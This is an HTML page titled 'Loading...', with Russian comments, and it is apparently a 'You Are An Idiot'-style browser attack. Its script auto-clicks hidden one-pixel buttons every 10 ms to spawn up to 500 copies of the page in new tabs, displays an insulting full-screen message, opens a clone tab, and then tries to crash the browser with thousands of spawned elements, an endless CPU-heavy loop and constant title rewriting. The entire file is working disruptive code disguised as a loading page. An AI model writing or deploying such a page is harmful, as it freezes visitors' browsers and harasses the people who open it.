<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            background: #000;
            overflow: hidden;
            font-family: Arial, sans-serif;
            color: #fff;
        }

        .pixel-btn {
            position: fixed;
            width: 1px;
            height: 1px;
            background: #ffffff;
            border: none;
            padding: 0;
            margin: 0;
            cursor: pointer;
            z-index: 9999;
            -webkit-tap-highlight-color: transparent;
            opacity: 0.01;
        }

        #pixel-btn-1 { top: 50%; left: 50%; }
        #pixel-btn-2 { top: 50%; left: 51%; }

        #counter {
            position: fixed;
            top: 10px;
            left: 50%;
            transform: translateX(-50%);
            font-family: monospace;
            font-size: 16px;
            color: #ff0000;
            font-weight: bold;
            z-index: 10000;
            pointer-events: none;
            text-align: center;
            line-height: 1.4;
        }

        #idiot-screen {
            position: fixed;
            inset: 0;
            background: #ffffff;
            color: #000000;
            display: none;
            align-items: center;
            justify-content: center;
            text-align: center;
            font-family: monospace;
            font-weight: bold;
            font-size: 48px;
            padding: 20px;
            z-index: 999999;
            user-select: none;
            line-height: 1.2;
            word-break: break-word;
        }
    </style>
</head>
<body>

    <div id="counter">
        CLICKS: 0 | TABS: 0<br>
        STATUS: spam
    </div>

    <div id="idiot-screen">YOU ARE AN IDIOT AHAHAHAHAHAHAH</div>

    <button id="pixel-btn-1" class="pixel-btn" aria-label="button1"></button>
    <button id="pixel-btn-2" class="pixel-btn" aria-label="button2"></button>

    <script>
        // ================== НАСТРОЙКИ ==================
        var CLICK_EVERY       = 10;     // мс между кликами (0.01 сек)
        var MAX_TABS          = 500;    // сколько вкладок пытаться открыть максимум
        var SHOW_IDIOT_AFTER  = 1000;   // мс до показа надписи
        var CLONE_AFTER       = 1000;   // мс после надписи до открытия клона
        var CRASH_AFTER       = 4000;   // мс до старта краша
        // ===============================================

        var btn1 = document.getElementById('pixel-btn-1');
        var btn2 = document.getElementById('pixel-btn-2');
        var counter = document.getElementById('counter');
        var idiotScreen = document.getElementById('idiot-screen');

        var clicks = 0;
        var tabsOpened = 0;
        var blockCount = 0;
        var allowed = false;
        var interval1 = null;
        var interval2 = null;

        var isClone = false;
        try {
            isClone = location.search.indexOf("clone=1") !== -1;
        } catch (e) {}

        function updateCounter() {
            if (isClone) return;
            var status = allowed ? "ALLOWED" : (blockCount > 0 ? "BLOCKED x" + blockCount : "spam");
            counter.innerHTML =
                "CLICKS: " + clicks + " | TABS: " + tabsOpened + "<br>" +
                "STATUS: " + status;
        }

        function tryOpenTab() {
            // проверка активации: navigator.userActivation (Chrome 100+)
            try {
                if (navigator.userActivation && navigator.userActivation.hasBeenActive) {
                    allowed = true;
                }
            } catch (e) {}

            var url = location.href;

            try {
                var w = window.open(url, "_blank");
                if (w && !w.closed) {
                    tabsOpened++;
                } else {
                    blockCount++;
                }
            } catch (e) {
                blockCount++;
            }

            // если реально была заблокирована — Chrome кидает warning в консоль
            // а window.open возвращает null или объект с closed=true
            updateCounter();

            // останавливаем спам, если уже открыли максимум
            if (MAX_TABS > 0 && tabsOpened >= MAX_TABS) {
                if (interval1) clearInterval(interval1);
                if (interval2) clearInterval(interval2);
                interval1 = null;
                interval2 = null;
                updateCounter();
            }
        }

        function doClick(btn) {
            clicks++;
            try { btn.click(); } catch (e) {}
            updateCounter();
        }

        // --- кнопка 1 ---
        btn1.addEventListener('click', function () {
            tryOpenTab();
        });

        // --- кнопка 2 ---
        btn2.addEventListener('click', function () {
            tryOpenTab();
        });

        // --- спам кнопками ---
        interval1 = setInterval(function () {
            doClick(btn1);
        }, CLICK_EVERY);

        interval2 = setInterval(function () {
            doClick(btn2);
        }, CLICK_EVERY);

        // --- показать YOU ARE AN IDIOT через 1 сек ---
        setTimeout(function () {
            counter.style.display = 'none';
            btn1.style.display = 'none';
            btn2.style.display = 'none';
            idiotScreen.style.display = 'flex';

            setTimeout(function () {
                try {
                    var url = location.pathname + "?clone=1";
                    window.open(url, "_blank");
                } catch (e) {}
            }, CLONE_AFTER);
        }, SHOW_IDIOT_AFTER);

        // --- краш через 4 сек ---
        function startCrash() {
            var spawned = 0;
            var spawnInt = setInterval(function () {
                if (spawned >= 5000) {
                    clearInterval(spawnInt);
                    return;
                }
                spawned++;
                try {
                    var win = document.createElement('div');
                    win.className = 'crash-window';
                    win.style.position = 'fixed';
                    win.style.background = '#000';
                    win.style.color = '#fff';
                    win.style.border = '2px solid #fff';
                    win.style.fontFamily = 'monospace';
                    win.style.fontWeight = 'bold';
                    win.style.padding = '6px';
                    win.style.zIndex = '999998';
                    win.style.pointerEvents = 'none';
                    var w = 100 + Math.floor(Math.random() * 120);
                    var h = 40 + Math.floor(Math.random() * 60);
                    var x = Math.max(0, Math.floor(Math.random() * (window.innerWidth - w)));
                    var y = Math.max(0, Math.floor(Math.random() * (window.innerHeight - h)));
                    win.style.left = x + 'px';
                    win.style.top = y + 'px';
                    win.style.width = w + 'px';
                    win.style.height = h + 'px';
                    win.textContent = 'YOU ARE AN IDIOT #' + spawned;
                    document.body.appendChild(win);
                } catch (e) {}
            }, 5);

            // тяжёлый цикл
            function heavyLoop() {
                var x = 0;
                for (var i = 0; i < 5000000; i++) {
                    x += Math.sin(i) * Math.cos(i);
                }
                Promise.resolve().then(heavyLoop);
            }
            setTimeout(heavyLoop, 200);

            // спам в document.title
            setInterval(function () {
                try {
                    document.title = Math.random().toString(36).repeat(20);
                } catch (e) {}
            }, 0);
        }

        setTimeout(startCrash, CRASH_AFTER);
    </script>
</body>
  </html>
